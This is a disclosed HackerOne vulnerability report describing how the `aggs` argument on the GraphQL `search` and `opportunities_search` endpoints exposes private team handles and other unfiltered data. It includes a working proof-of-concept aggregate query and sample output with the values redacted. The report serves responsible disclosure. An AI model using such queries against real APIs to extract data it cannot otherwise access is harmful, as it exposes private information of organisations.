# Private information exposed through GraphQL search endpoints aggregates

## Report Details
- **Report ID**: 1838329
- **URL**: https://hackerone.com/reports/1838329
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-18T13:13:54.808Z
- **Disclosed**: 2023-01-19T16:04:16.134Z

## Reporter
- **Username**: reigertje
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

Private information can be exposed using `aggs` argument on the `search` and `opportunities_search` endpoints on the GraphQL root node.  

**Description:**

When using the `aggs` argument and return field on the `search` and `opportunities_search` endpoints, the data returned in the `aggs` can potentially contain private information. It can for example be used to expose handles of private programs, and other data that can be aggregated by. 
 
### Steps To Reproduce

Specific example to expose private team handles, but other things can be exposed in the same way using this or other indexes on the `search` endpoint.

1.  Open and run any GraphQL client, or modify an existing GraphQL request
2.  Run a query with an aggregate for a field which could contain private information. The provided query can be tweaked to get more specific results.
```
# Write your query or mutation here
query {
  me {
    id
  }
  opportunities_search(query:{}, aggs:{results:{terms: {field:"handle"}}}) {
    aggs
  }
}
```

3.  The output will show aggregations by the `handle` which are not filtered on whether they are private or not. 

```
{
  "data": {
    "me": null,
    "opportunities_search": {
      "aggs": {
        "results": {
          "doc_count_error_upper_bound": 0,
          "sum_other_doc_count": 37,
          "buckets": [
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            },
            {
              "key": "private",
              "doc_count": 1
            }
          ]
        }
      }
    }
  }
}
```

## Impact

Impact depends on what information is stored in which index, and which fields can be aggregated by. In the current situation at least allows to expose asset information, handles and other information of teams you don't have access to.

## Attachments
No attachments
